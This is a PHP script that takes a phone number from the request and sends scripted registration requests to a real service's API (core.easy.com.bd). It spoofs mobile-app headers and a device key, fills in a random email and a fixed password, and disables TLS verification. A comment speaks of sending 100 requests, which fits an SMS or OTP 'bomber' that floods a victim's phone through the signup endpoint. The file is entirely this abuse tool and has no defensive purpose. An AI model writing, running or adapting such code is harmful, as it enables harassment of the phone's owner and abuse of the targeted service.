<?php

$phn = $_REQUEST["phone"];

// Loop to send 100 requests
for ($i = 0; $i < 1; $i++) {
    $random_email = "user" . rand(1000, 9999) . "@example.com"; // Generates a random email address

    $url = "https://core.easy.com.bd/api/v1/registration";

    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $headers = array(
        "User-Agent: okhttp/4.11.0",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/x-www-form-urlencoded",
        "device-key: bf28a7936adafd15",
        "lang: en"
    );
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

    $data = http_build_query(array(
        'password' => 'sojib12345',
        'password_confirmation' => 'sojib12345',
        'name' => 'asd',
        'mobile' => '+88' . $phn,
        'referrer_key' => '',
        'email' => $random_email, // Use the generated random email address
        'phone' => $phn
    ));

    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

    // For debug only!
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

    $resp = curl_exec($curl);
    curl_close($curl);
    echo $resp; // Print the response for each request
}
?>
